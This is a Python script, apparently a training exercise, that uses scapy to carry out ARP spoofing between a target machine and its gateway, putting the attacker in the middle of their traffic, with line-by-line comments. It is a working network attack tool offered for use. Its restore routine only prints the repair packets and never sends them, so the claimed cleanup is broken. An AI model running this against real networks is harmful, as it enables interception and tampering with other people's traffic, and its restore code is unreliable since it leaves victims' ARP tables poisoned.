import scapy.all as scapy
import time
import sys
import argparse


# Function get get arguments passed after calling the script
def get_arguments():
    # Initialize the Argument Parser Module
    parser = argparse.ArgumentParser()
    # Add Argument --target user wishes to scan
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    # add the parser arguments into  a variable called options
    options = parser.parse_args()
    # Return the options variable housing parser arguments
    return options


# function get get mac address with + parameter IP
def get_mac(ip):
    # create an arp request using scapy arp call with ip parameter
    arp_request = scapy.ARP(pdst=ip)
    # create a broadcast variable using ether for mac address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # append the broadcast and arp request into arp_request boradcast variap
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


# Spoof function + target_ip and Spoof_ip parameters
def spoof(target_ip, spoof_ip):
    # target mac variable to get mac from target ip
    target_mac = get_mac(target_ip)
    # sent a packet using scapy arp call
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # send the spoof packet
    scapy.send(packet)


# Function to restore arp tables using + destination_ip and source_ip parameters
def restore(destination_ip, source_ip):
    # Get the destination mac using get mac function and destination ip
    destination_mac = get_mac(destination_ip)
    # source mac is equal to get mac from source ip
    source_mac = get_mac(source_ip)
    # packet is the arp call to restore orginal arp tables
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # show packet
    print(packet.show())
    # show summary
    print(packet.summary())


options = get_arguments()
# set target ip variable
target_ip = options.target
# set gateway variable
gateway_ip = options.gateway
try:
    # set packets sent count variable
    packets_sent_count = 0
    while True:
        # spoof target ip and gateway ip
        spoof(target_ip, gateway_ip)
        # spoof gateway ip to target ip
        spoof(gateway_ip, target_ip)
        # increase packets sent count
        packets_sent_count = packets_sent_count + 2
        # print sent packets error
        print("\r[+] Sent " + str(packets_sent_count)),
        # flush stdout
        sys.stdout.flush()
        # sleep 2 to slow output
        time.sleep(2)
# except keyboard interrupt
except KeyboardInterrupt:
    # print error message detecting ctrl c
    print("\n[-] Detected CTRL + C .... Resetting ARP tables .... please wait.\n")
    # restore arp table
    restore(target_ip, gateway_ip)
    # restore arp table
    restore(gateway_ip, target_ip)
